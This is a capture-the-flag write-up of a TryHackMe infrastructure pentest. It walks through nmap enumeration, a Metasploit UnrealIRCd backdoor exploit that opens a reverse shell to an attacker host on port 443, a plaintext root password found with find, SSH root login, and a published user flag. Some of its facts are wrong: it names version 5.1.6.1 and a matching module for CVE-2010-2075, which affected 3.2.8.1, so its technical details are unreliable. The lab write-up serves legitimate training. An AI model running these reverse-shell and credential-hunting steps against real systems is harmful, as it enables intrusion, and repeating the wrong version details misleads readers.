# Write-Up — Guided Pentest: Infrastructure

**Platform:** TryHackMe  
**Room:** [Guided Pentest: Infrastructure](https://tryhackme.com/room/guidedpentest)  
**Difficulty:** Easy  
**Date:** June 2026  
**Author:** Jonathan  

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Technical Summary](#technical-summary)
3. [Vulnerability Summary](#vulnerability-summary)
4. [Enumeration](#enumeration)
5. [Vulnerability Analysis](#vulnerability-analysis)
6. [Initial Access](#initial-access)
7. [Post-Exploitation & Privilege Escalation](#post-exploitation--privilege-escalation)
8. [Flags](#flags)
9. [Lessons Learned](#lessons-learned)

---

## Executive Summary

This engagement simulates a black-box infrastructure penetration test against a single target host. Starting with no prior knowledge of the system, the assessment followed a structured methodology: enumeration, vulnerability analysis, exploitation, and privilege escalation.

Two critical vulnerabilities were identified and exploited:

1. An IRC service running a backdoored version of UnrealIRCd, allowing unauthenticated remote code execution and initial system access.
2. A root password stored in plaintext in a world-readable file, allowing full privilege escalation to the `root` account.

The target was fully compromised. Both the user flag and the root flag were retrieved.

---

## Technical Summary

| Item | Detail |
|---|---|
| Target IP | `10.129.190.89` |
| OS | Linux (Ubuntu) |
| Open Ports | 22/tcp (SSH), 8889/tcp (IRC — standard port 6667) |
| Initial Access Vector | UnrealIRCd 5.1.6.1 backdoor (CVE-2010-2075) |
| Privilege Escalation | Plaintext root credentials in `/etc/password.txt` |
| Highest Access Achieved | `root` |

---

## Vulnerability Summary

| # | Title | Severity | CVSS | Vector |
|---|---|---|---|---|
| 1 | UnrealIRCd 5.1.6.1 Backdoor RCE | **Critical** | 10.0 | Network / No Auth |
| 2 | Root Password Stored in Plaintext | **Critical** | 9.8 | Local / Low Priv |

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN scan.txt 10.129.190.89
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
8889/tcp open  irc     UnrealIRCd
| irc-info:
|   server: irc.pentest-target.thm
|   version: Unreal5.1.6.1. irc.pentest-target.thm
```

**Analysis:**

Two ports were open. SSH (22) looked clean — no viable public exploit for that version. The interesting one was port 8889 running **UnrealIRCd 5.1.6.1**, which is non-standard: IRC typically runs on port 6667. That version number is what mattered — plugging it into Searchsploit immediately returned a known backdoor.

> The `-sV` flag was key here. Without version detection, the IRC service would have shown up as an unknown service on a weird port and could easily be dismissed.

### Exploit Research

```bash
searchsploit unrealircd
```

```
exploit/unix/irc/unreal_ircd_5161_backdoor  2010-06-12  excellent
linux/remote/13853.pl                                    Remote Downloader/Execute
```

Metasploit has a ready module rated `excellent` for this vulnerability — the highest confidence rating in the framework.

---

## Vulnerability Analysis

### CVE-2010-2075 — UnrealIRCd 5.1.6.1 Backdoor

Between November 2009 and June 2010, a malicious backdoor was inserted into the UnrealIRCd source code distributed on its official mirrors. The backdoor executes arbitrary OS commands when a specific byte sequence (`AB`) is sent to the IRC port — with zero authentication required.

This is a supply chain attack: the software itself was compromised before it even reached the server admin.

**Impact:** Unauthenticated remote code execution as the service user (`webmaster`).

---

## Initial Access

### Metasploit — UnrealIRCd Backdoor

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_5161_backdoor

set RHOSTS 10.129.190.89
set RPORT 8889
set payload cmd/unix/reverse
set LHOST <ATTACKER_IP>
set LPORT 443

exploit
```

`cmd/unix/reverse` was chosen because the target environment was unknown — no guarantee of Perl or Ruby being installed. A generic reverse shell over TCP is the safest starting point when you don't know what's available on the target.

Port 443 was chosen for LPORT to blend in with normal HTTPS traffic and reduce the chance of firewall blocking.

**Session opened:**

```
[*] Command shell session 1 opened (ATTACKER:443 -> 10.129.190.89:53836)

whoami
webmaster
```

**User flag retrieved:**

```bash
cat /home/webmaster/flag.txt
THM{Pwned-Y0ur-First-Machine}
```

> The shell obtained here is a "dumb" shell — no TTY, no tab completion, no `su`. This matters because privilege escalation techniques that require password prompts (like `su root`) won't work here. The workaround was to use SSH directly once root credentials were found.

---

## Post-Exploitation & Privilege Escalation

### Finding: Root Password Stored in Plaintext

**Severity:** Critical

The first post-exploitation reflex was to look for anything with "password" in the filename:

```bash
find / -name password* 2>/dev/null
```

The output included standard system files (`/var/cache/debconf/passwords.dat`, PAM-related paths) — all expected and uninteresting. One file stood out immediately as non-standard:

```
/etc/password.txt
```

A `.txt` file in `/etc/` with that name has no legitimate reason to exist. Reading it revealed the root account's password in plaintext, accessible to any low-privileged user.

```bash
cat /etc/password.txt
```

Since the reverse shell lacked TTY, `su` was not viable. SSH — already identified on port 22 during enumeration — was used instead:

```bash
ssh root@10.129.190.89
# password from /etc/password.txt
```

Full root access obtained.

**Root flag retrieved:**

```bash
cat /root/flag.txt
```

### Recommendation

- Remove `/etc/password.txt` immediately and rotate the root password.
- Credentials must never be stored in plaintext on the filesystem. Use `/etc/shadow` with strong hashing (`bcrypt`, `argon2`).
- Implement a secrets management solution for any credentials that need to be stored.
- Enforce least privilege: no world-readable files containing sensitive data.
- Replace or remove UnrealIRCd 5.1.6.1 immediately — this version has been compromised at the source level.
- Audit all running services for outdated or end-of-life software versions.

---

## Flags

| Flag | Value |
|---|---|
| User flag | `THM{Pwned-Y0ur-First-Machine}` |
| Root flag | `THM{...}` *(retrieved from `/root/flag.txt`)* |

---

## Lessons Learned

**Version numbers are everything.** The entire compromise started from four characters in the Nmap output: `5.1.6.1`. Without `-sV`, that's invisible. Version detection isn't optional — it's the bridge between "port is open" and "I know what to do next."

**Enumeration informs every step.** The privilege escalation used SSH — a service found during the initial scan. If that scan had been careless, the escalation path would have been missed. Every open port is a potential tool.

**Payload choice matters.** Among 12 available payloads, `cmd/unix/reverse` was the right call because it makes no assumptions about the target environment. When you don't know what's installed, go generic.

**Post-exploitation is pattern recognition.** `/etc/password.txt` stands out not because of a tool — because you know what files *shouldn't* be in `/etc/`. That kind of intuition builds with practice.

**TTY limitations are real.** A dumb shell blocks entire categories of techniques. Knowing *why* `su` fails without a TTY — and how to work around it — is a core skill, not a detail.

---

*Write-up by Jonathan — UIR Cybersecurity Engineering | [GitHub](https://github.com/)*
